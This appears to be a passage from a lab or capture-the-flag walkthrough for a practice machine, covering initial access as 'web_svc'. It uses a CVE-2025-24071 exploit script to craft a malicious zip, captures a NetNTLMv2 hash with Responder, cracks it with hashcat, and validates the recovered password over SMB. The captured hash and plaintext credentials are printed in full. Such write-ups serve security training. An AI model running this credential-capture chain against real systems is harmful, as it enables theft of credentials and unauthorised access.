
## Auth as web_svc

### Exploit via CVE-2025-24071

```sh
export ATTACKER=10.10.17.20 
uv run exploit.py -i $ATTACKER -f RouxTronics
unzip -l RouxTronics.zip
```

### Capture Net-NTLM-v2

> Use tool: [Responder](<../../../../../../02-Capture/Responder.md>)

upload the zip via the web form, and start [Responder](https://github.com/lgandx/Responder). 
After a minute or two, get a hit:

```sh
sudo responder -I tun0
```


![](<./attachments/03-Foothold.png>)

- Captured Hash
- Hash type: (NetNTLMv2) - 5600

```txt
web_svc::NANOCORP:58bf92c4beac2956:F147AE534D010A9877ED7665239D06A6:0101000000000000805B6BA04503DD0182E55F84837F50AA0000000002000800370045004D00310001001E00570049004E002D003100480047005900360045004C00370036004A00510004003400570049004E002D003100480047005900360045004C00370036004A0051002E00370045004D0031002E004C004F00430041004C0003001400370045004D0031002E004C004F00430041004C0005001400370045004D0031002E004C004F00430041004C0007000800805B6BA04503DD0106000400020000000800300030000000000000000000000000200000F4DB1AAADE1A184EA6FAAC2F3A5FB7EA79660EB270DF0DA8C1F14383A6DAF0D30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00320030000000000000000000
```

- save hash as `web_svc.hash`
### Cracking  Net-NTLMv2 Hash

> Using Tool: [Hashcat](<../../../../../../02-Capture/Hashcat.md>)

pass the hash to `hashcat`, and it auto-detects the format, and cracks it within a couple seconds:

```sh
hashcat web_svc.hash /usr/share/wordlists/rockyou.txt
```

![](<./attachments/03-Foothold-1.png>)


>[!SUCCESS] Creds 
> `web_svc:dksehdgh712!@#`

### Check Creds

```sh
netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#'
```

![](<./attachments/03-Foothold-2.png>)

